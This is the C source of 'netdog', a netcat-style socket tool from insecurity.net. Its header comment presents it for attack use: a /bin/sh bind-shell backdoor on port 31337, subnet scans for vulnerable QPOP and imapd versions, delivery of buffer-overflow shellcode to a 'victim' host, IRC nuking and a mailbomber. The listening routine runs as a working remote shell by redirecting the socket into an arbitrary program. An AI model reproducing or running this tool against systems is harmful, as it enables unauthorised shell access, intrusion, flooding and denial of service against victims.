/* netdog.c
 * Version: 1.0
 * GPL V2
 * by stanly@insecurity.net
 * Credits: typo, edi, wildsau
 *
 * To get SMTP Version, POP Server
 *   netdog -p 25 -n 1 -t victim.blah.com
 *   netdog -p 110 -n 1 -t victim.blah.com
 *
 * For a simply shell backdoor
 *   netdog -l -x /bin/sh -p 31337
 *
 * Scanning subnets for QPOP, imapd ...
 *   netdog -p 110 -n 1 -t \
 *   `host -l v.at | grep -v name | awk '{ print $1; }'`  \
 *   grep "QPOP 2.2"
 *
 * For exploits: If you want to send the buffer overflow code
 *   netdog -t victim.blah.com -f asmcode -p 110
 *
 * For sending files
 *   On the target computer -> netscan -l -v -p 12345 -f qpop.c
 *   On the local computer -> netscan -v -t target.com -p 12345 -f qpop.c
 *   IMPORTANT: First start the util on the target computer, else it doesnt
 *              work :)
 *
 * For nuking somebody in IRC
 *   netdog -v -t victim.com -p 139 -f blahblah.dat
 *
 * A simple mailbomber
 *   netdog -v -t victim.com -p 25 -e 1000 -f email.dat
 *   IMPORTANT: In email.dat you must write the MAIL FROM blah yourself :(
 *
 * Telnet
 *   netdog -d -t victim.com
 *
 */
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>

#define MAX 255
#define MAX_BUF 2048

static int max_pakets=0,only=0,counter=1,udp=0,telnet=0;
static char buffer[MAX_BUF];

int nread(char *ptr,int max,FILE *fp);
int conn(int *sock, char *server, int port);
int listening(int port,char *program, char *file);
int create_socket(int *s);
void connecting(char *server, int port, char *file);
void helpscreen();

void main(int argc, char **argv)
{
   int port=23,what=0,i;
   char host[MAX]="127.0.0.1",prog[MAX]="",fn[MAX]="",c;
   extern int optind;
   extern char *optarg;

   if (argc==1) helpscreen();

   while ( (c=getopt(argc,argv,"duvhln:p:x:f:t:e:"))>0)
   {
      switch(c)
      {
         case 'd': telnet=1;break;
         case 'p': port=atoi(optarg);break;
         case 'l': what=1;break;
         case 'v': only=1;break;
         case 'u': udp=1;break;
         case 'c': counter=atoi(optarg);break;
         case 'x': strcpy(prog,optarg);break;
         case 'n': max_pakets=atoi(optarg);break;
         case 'f': strcpy(fn,optarg);break;
         case 't': strcpy(host,optarg);break;
         case 'h': helpscreen();break;
      }
   }

   if (!what) connecting(host,port,fn);
   else listening(port,prog,fn);
}

void connecting(char *server, int port,char *file)
{
   int sock,closed=1,max,counting,i;
   fd_set afds,fds;
   FILE *fp=NULL;

   /* Look for the file to send */
   if (strcmp(file,""))
   {
       fp=fopen(file,"r");
       if (!fp)
       {
          fprintf(stderr,"Cant open %s\n",file);
          exit(0);
       }
   }

   if (conn(&sock,server,port)) exit(1);

   counting=counter;
   if (!counting) counting++;
   if (fp)
   {
      do
      {
         while(!feof(fp))
         {
            bzero(&buffer,MAX_BUF);
            max=nread(buffer,MAX_BUF,fp);
            send(sock,buffer,max,0x4);
         }
         rewind(fp);
         clearerr(fp);
         if (counter) counting--;
      } while(counting);
      fclose(fp);
   }
   if (only) { close(sock); exit(0); }
   FD_ZERO(&afds);
   FD_SET(0,&afds);
   FD_SET(sock,&afds);
   max=max_pakets;
   if (!max) max++;
   closed=1;
   while(max && closed)
   {
       bzero(&buffer,sizeof(buffer));
       memcpy(&fds,&afds,sizeof(afds));
       select(sock+1,&fds,NULL,NULL,NULL);
       if (FD_ISSET(sock,&fds))
       {
           closed=recv(sock,buffer,sizeof(buffer),0x4);
           if (telnet)
           {
               for (i=0;i<closed;i++)
                   if (buffer[i]==(char)0xff)
                   {
                      if ((buffer[i+1]==(char)0xfb)||(buffer[i+1]==(char)0xfc))
                      {
                         buffer[i+1]=0xfe;
                         send(sock,buffer+i,3,0x4);
                      }
                      if ((buffer[i+1]==(char)0xfd)||(buffer[i+1]==(char)0xfe))
                      {
                         buffer[i+1]=0xfc;
                         send(sock,buffer+i,3,0x4);
                      }
                  }
              /*  I dont want the bullshit chars from telnet :) */
              if (buffer[0]!=(char)0xff) write(0,buffer,closed);
           } else write(0,buffer,closed);
           if (max_pakets) max--;
       }
       if (FD_ISSET(0,&fds))
       {
           closed=read(0,buffer,sizeof(buffer));
           send(sock,buffer,closed,0x4);
       }
   }
   close(sock);
}

int listening(int port,char *program,char *file)
{
   struct sockaddr_in s_in,s_out;
   int s_rc,s,length,s_d,r=1;
   fd_set fds;
   FILE *fp;

   create_socket(&s);

   bzero((char *)&s_in,sizeof(s_in));
   s_in.sin_family=AF_INET;
   s_in.sin_addr.s_addr=htonl(INADDR_ANY);
   s_in.sin_port=htons(port);

   s_rc=bind(s,(struct sockaddr*)&s_in,sizeof(s_in));
   s_rc=listen(s,1);
   setpgrp();
   while(1)
   {
      length=sizeof(s_out);
      s_d=accept(s,(struct sockaddr*)&s_out,&length);
      if (fork())
      {
         if (strcmp(program,""))
         {
            dup2(s_d,0);
            dup2(s_d,1);
            dup2(s_d,2);
            system(program);
         }
         else
         {
            if (file) fp=fopen(file,"w");
            FD_ZERO(&fds);
            FD_SET(s_d,&fds);
            while(r)
            {
               select(s_d+1,&fds,NULL,NULL,NULL);
               if (FD_ISSET(s_d,&fds))
               {
                   bzero(&buffer,sizeof(buffer));
                   r=recv(s_d,buffer,sizeof(buffer),0x4);
                   if (r)
                     if (fp) fwrite(buffer,r,1,fp);
                         else write(0,buffer,r);
               }
            }
            fclose(fp);
         }
         close(s_d);
         exit(1);
      }
      close(s_d);
   }
   close(s);
}

int conn(int *sock, char *server, int port)
{
   struct sockaddr_in s_in;
   struct hostent *he;
   char *ip;

   create_socket(sock);

   bzero((char *)&s_in,sizeof(s_in));
   s_in.sin_family=AF_INET;
   s_in.sin_addr.s_addr=inet_addr(server);
   s_in.sin_port=htons(port);

   if ((he=gethostbyname(server))!=NULL)
       bcopy(he->h_addr,(char *)&s_in.sin_addr,he->h_length);
   else  if ((s_in.sin_addr.s_addr=inet_addr(server))<0) return 2;

   if (connect(*sock,(struct sockaddr *)&s_in,16)==-1)
   {
      fprintf(stderr,"Cant connect to %s:%d\n",server,port);
      close(*sock);
      return 3;
   }
   return 0;
}

void helpscreen()
{
   printf("NetDog V1.0, by Stanly <stanly@insecurity.net>\n");
   printf(">>> INSECURITY.NET <<<\n");
   printf("\t-n [max_pakets] ... Number of max. recving pakets\n");
   printf("\t-p [port number]  ... Port you want to connect\n");
   printf("\t-l [port number] ... Listen on a port\n");
   printf("\t-t [victim.com]  ... Target for connecting\n");
   printf("\t-x [/bin/sh]... Program that will be started when connecting\n");
   printf("\t-f [code.dat] ... File to send after connecting or to recieve\n");
   printf("\t-v ... Disconnect after the file was sent\n");
   printf("\t-u ... UDP Mode\n");
   printf("\t-d ... Telnet Mode\n");
   printf("\t-c [number] ... Sends the file xxx times. (0 = infinite) \n");
   printf("\t-h ... This screen ;)\n");
   exit(0);
}

/* Use nread because fread doesnt return how many chars are read */
int nread(char *ptr,int max,FILE *fp)
{
   int i=0;
   char c;
   if (fp)
     while (!feof(fp) && i<max)
       if(c=fgetc(fp)) ptr[i++]=c;
   return i-1;
}

int create_socket(int *s)
{
   if (udp)
   {
      if ((*s=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP))==-1) /* UDP */
      {
         fprintf(stderr,"Cant create UDP socket\n");
         exit(1);
      }
   }
   else
   {
      if ((*s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1) /* TCP */
      {
         fprintf(stderr,"Cant create TCP socket\n");
         exit(1);
      }
   }
}

